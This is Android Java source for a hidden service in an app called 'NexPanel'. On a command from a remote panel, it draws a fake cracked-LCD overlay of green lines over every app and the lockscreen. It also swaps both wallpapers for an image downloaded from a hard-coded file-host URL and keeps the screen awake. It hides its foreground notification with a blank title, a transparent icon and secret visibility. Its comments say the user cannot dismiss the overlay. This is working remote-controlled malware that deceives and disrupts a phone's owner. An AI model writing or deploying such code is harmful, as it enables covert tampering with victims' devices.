package com.nex.panel;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.WallpaperManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;

import androidx.core.app.NotificationCompat;

import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * LcdEffectService — Efek LCD Rusak (4 Garis Hijau Vertikal + Ganti Wallpaper)
 * ═══════════════════════════════════════════════════════════════════════════════
 *
 *  Saat ACTION_START_LCD_EFFECT diterima:
 *  1. Overlay 4 garis hijau vertikal muncul FULLSCREEN di atas semua app
 *     - FLAG_NOT_TOUCHABLE → sentuhan tetap tembus ke app di bawah (game dll tetap jalan)
 *     - FLAG_NOT_FOCUSABLE → keyboard/input tetap ke app di bawah
 *     - FLAG_SHOW_WHEN_LOCKED → garis tetap terlihat di lockscreen
 *  2. Wallpaper otomatis diganti ke URL yang dikirim (default = catbox)
 *  3. Garis TIDAK BISA dihilangkan oleh user biasa
 *  4. Hanya hilang saat ACTION_STOP_LCD_EFFECT diterima dari panel
 *
 *  Alur:
 *  Panel → "lcdEffect"  → overlay garis muncul + wallpaper diganti
 *  Panel → "stopLcdEffect" → overlay hilang, hp kembali normal
 *
 *  Extra:
 *  EXTRA_WALLPAPER_URL — URL gambar wallpaper (opsional, ada default)
 *  EXTRA_LINE_COUNT    — jumlah garis (default 4, max 8)
 *  EXTRA_LINE_COLOR    — warna garis dalam hex string, misal "#00FF00" (default hijau)
 *  EXTRA_LINE_WIDTH_DP — tebal garis dalam dp (default 3)
 */
public class LcdEffectService extends Service {

    private static final String TAG     = "LcdEffectService";
    private static final String CHANNEL = "nex_lcd_effect";
    private static final int    NOTIF_ID = 9990;

    public static final String ACTION_START_LCD_EFFECT = "com.nex.panel.ACTION_START_LCD_EFFECT";
    public static final String ACTION_STOP_LCD_EFFECT  = "com.nex.panel.ACTION_STOP_LCD_EFFECT";
    public static final String EXTRA_WALLPAPER_URL     = "wallpaper_url";
    public static final String EXTRA_LINE_COUNT        = "line_count";
    public static final String EXTRA_LINE_COLOR        = "line_color";
    public static final String EXTRA_LINE_WIDTH_DP     = "line_width_dp";

    // Default wallpaper URL
    private static final String DEFAULT_WALLPAPER_URL =
        "https://files.catbox.moe/ozuwfn.jpg";

    // Singleton guard
    private static LcdEffectService instance;
    public static boolean isRunning() { return instance != null; }

    private WindowManager   wm;
    private View            overlayView;
    private PowerManager.WakeLock wakeLock;
    private ExecutorService executor;
    private final Handler   uiHandler = new Handler(Looper.getMainLooper());

    // ── onCreate ─────────────────────────────────────────────────────────
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        wm       = (WindowManager) getSystemService(WINDOW_SERVICE);
        executor = Executors.newSingleThreadExecutor();
        createNotificationChannel();
        startForeground(NOTIF_ID, buildSilentNotification());
        acquireWakeLock();
    }

    // ── onStartCommand ────────────────────────────────────────────────────
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_NOT_STICKY;
        String action = intent.getAction();

        if (ACTION_START_LCD_EFFECT.equals(action)) {
            String wallpaperUrl = intent.getStringExtra(EXTRA_WALLPAPER_URL);
            if (wallpaperUrl == null || wallpaperUrl.isEmpty())
                wallpaperUrl = DEFAULT_WALLPAPER_URL;

            int    lineCount   = intent.getIntExtra(EXTRA_LINE_COUNT, 4);
            String lineColor   = intent.getStringExtra(EXTRA_LINE_COLOR);
            if (lineColor == null || lineColor.isEmpty()) lineColor = "#00FF00";
            int lineWidthDp    = intent.getIntExtra(EXTRA_LINE_WIDTH_DP, 3);

            // Clamp nilai aman
            lineCount = Math.min(Math.max(lineCount, 1), 8);
            lineWidthDp = Math.min(Math.max(lineWidthDp, 1), 20);

            final String finalWallUrl   = wallpaperUrl;
            final int    finalLineCount = lineCount;
            final int    finalLineColor;
            int parsedColor;
            try {
                parsedColor = Color.parseColor(lineColor);
            } catch (Exception e) {
                parsedColor = Color.GREEN;
            }
            finalLineColor = parsedColor;
            final int finalLineWidthDp = lineWidthDp;

            // Tampilkan overlay garis di UI thread
            uiHandler.post(() ->
                showLcdOverlay(finalLineCount, finalLineColor, finalLineWidthDp));

            // Ganti wallpaper di background thread
            final String wallUrl = finalWallUrl;
            executor.execute(() -> downloadAndSetWallpaper(wallUrl));

        } else if (ACTION_STOP_LCD_EFFECT.equals(action)) {
            uiHandler.post(this::stopLcdEffect);
        }

        return START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    // ── onDestroy ─────────────────────────────────────────────────────────
    @Override
    public void onDestroy() {
        super.onDestroy();
        instance = null;
        removeOverlay();
        releaseWakeLock();
        if (executor != null && !executor.isShutdown()) executor.shutdownNow();
    }

    // ═══════════════════════════════════════════════════════════════════════
    // LCD OVERLAY — 4 garis hijau vertikal fullscreen
    // ═══════════════════════════════════════════════════════════════════════

    private void showLcdOverlay(int lineCount, int lineColor, int lineWidthDp) {
        try {
            removeOverlay(); // hapus overlay lama kalau ada

            // Ukuran layar
            DisplayMetrics dm = getResources().getDisplayMetrics();
            final int screenW = dm.widthPixels;
            final int screenH = dm.heightPixels;
            final float density = dm.density;
            final int lineWidthPx = Math.max(1, (int)(lineWidthDp * density));

            // Custom view yang menggambar 4 garis hijau vertikal
            View lcd = new View(this) {
                @Override
                protected void onDraw(Canvas canvas) {
                    super.onDraw(canvas);

                    Paint paint = new Paint();
                    paint.setColor(lineColor);
                    paint.setStrokeWidth(lineWidthPx);
                    paint.setStyle(Paint.Style.FILL);
                    paint.setAntiAlias(false); // garis pixel-perfect

                    // Bagi layar menjadi (lineCount+1) bagian agar garis tersebar merata
                    // Contoh 4 garis: posisi di 1/5, 2/5, 3/5, 4/5 lebar layar
                    int totalSections = lineCount + 1;
                    for (int i = 1; i <= lineCount; i++) {
                        float x = (float) screenW * i / totalSections;
                        // Gambar garis vertikal full height
                        canvas.drawRect(
                            x - lineWidthPx / 2f,  // left
                            0,                      // top
                            x + lineWidthPx / 2f,  // right
                            screenH,                // bottom
                            paint
                        );
                    }
                }
            };

            // WAJIB: tanpa ini onDraw() tidak pernah dipanggil pada plain View
            lcd.setWillNotDraw(false);
            // Software rendering agar Canvas.drawRect() bekerja benar di semua device
            lcd.setLayerType(View.LAYER_TYPE_SOFTWARE, null);

            overlayView = lcd;

            // WindowManager params:
            // FLAG_NOT_TOUCHABLE  → sentuhan tembus ke app di bawah (game tetap bisa dimainkan)
            // FLAG_NOT_FOCUSABLE  → keyboard/input tetap ke app di bawah
            // FLAG_LAYOUT_NO_LIMITS → garis melewati status bar dan navigation bar
            // FLAG_SHOW_WHEN_LOCKED → garis tetap ada di lockscreen
            int overlayType = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                screenW,
                screenH,
                overlayType,
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE      |  // ← game tetap bisa dimainkan
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE       |  // ← input tetap ke app bawah
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN    |
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS    |  // ← melewati status bar
                WindowManager.LayoutParams.FLAG_FULLSCREEN           |
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED     |  // ← ada di lockscreen
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                PixelFormat.TRANSLUCENT  // ← transparan di antara garis
            );
            params.gravity = Gravity.TOP | Gravity.START;
            params.x = 0;
            params.y = 0;

            wm.addView(overlayView, params);
            // Paksa redraw segera setelah view masuk ke window
            overlayView.post(() -> overlayView.invalidate());
            Log.d(TAG, "LCD Effect overlay shown: " + lineCount + " garis");

        } catch (Exception e) {
            Log.e(TAG, "showLcdOverlay error: " + e.getMessage());
            stopSelf();
        }
    }

    private void stopLcdEffect() {
        removeOverlay();
        releaseWakeLock();
        stopSelf();
        Log.d(TAG, "LCD Effect stopped");
    }

    private void removeOverlay() {
        try {
            if (wm != null && overlayView != null) {
                wm.removeView(overlayView);
            }
        } catch (Exception ignored) {}
        overlayView = null;
    }

    // ═══════════════════════════════════════════════════════════════════════
    // WALLPAPER — download dan set wallpaper dari URL
    // ═══════════════════════════════════════════════════════════════════════

    private void downloadAndSetWallpaper(String imageUrl) {
        HttpURLConnection connection = null;
        InputStream inputStream = null;
        try {
            Log.d(TAG, "Download wallpaper LCD dari: " + imageUrl);

            URL url = new URL(imageUrl);
            connection = (HttpURLConnection) url.openConnection();
            connection.setConnectTimeout(15000);
            connection.setReadTimeout(30000);
            connection.setDoInput(true);
            connection.setRequestProperty("User-Agent",
                "Mozilla/5.0 (Android) NexPanel/1.0");
            connection.connect();

            int code = connection.getResponseCode();
            if (code != HttpURLConnection.HTTP_OK) {
                Log.e(TAG, "HTTP error wallpaper: " + code);
                return;
            }

            inputStream = connection.getInputStream();
            BitmapFactory.Options opts = new BitmapFactory.Options();
            opts.inPreferredConfig = Bitmap.Config.ARGB_8888;
            Bitmap bitmap = BitmapFactory.decodeStream(inputStream, null, opts);

            if (bitmap == null) {
                Log.e(TAG, "Gagal decode bitmap wallpaper");
                return;
            }

            WallpaperManager wpm = WallpaperManager.getInstance(getApplicationContext());
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                // Set home screen + lock screen sekaligus
                wpm.setBitmap(bitmap, null, true,
                    WallpaperManager.FLAG_SYSTEM | WallpaperManager.FLAG_LOCK);
            } else {
                wpm.setBitmap(bitmap);
            }
            bitmap.recycle();
            Log.d(TAG, "Wallpaper LCD berhasil di-set");

        } catch (Exception e) {
            Log.e(TAG, "downloadAndSetWallpaper error: " + e.getMessage());
        } finally {
            try { if (inputStream != null) inputStream.close(); } catch (Exception ignored) {}
            try { if (connection != null) connection.disconnect(); } catch (Exception ignored) {}
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // WAKELOCK
    // ═══════════════════════════════════════════════════════════════════════

    private void acquireWakeLock() {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(
                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK |
                    PowerManager.ACQUIRE_CAUSES_WAKEUP,
                    "NexPanel:LcdEffectWakeLock"
                );
                wakeLock.acquire(60 * 60 * 1000L); // max 1 jam
            }
        } catch (Exception ignored) {}
    }

    private void releaseWakeLock() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                wakeLock = null;
            }
        } catch (Exception ignored) {}
    }

    // ═══════════════════════════════════════════════════════════════════════
    // NOTIFICATION (foreground service)
    // ═══════════════════════════════════════════════════════════════════════

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                NotificationChannel ch = new NotificationChannel(
                    CHANNEL, "NexPanel System", NotificationManager.IMPORTANCE_NONE);
                ch.setSound(null, null);
                ch.enableVibration(false);
                ch.setShowBadge(false);
                ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
                NotificationManager nm =
                    (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
                if (nm != null) nm.createNotificationChannel(ch);
            } catch (Exception ignored) {}
        }
    }

    private Notification buildSilentNotification() {
        return new NotificationCompat.Builder(this, CHANNEL)
            .setSmallIcon(R.drawable.ic_transparent)
            .setContentTitle("")
            .setContentText("")
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .setOngoing(false)
            .build();
    }
}
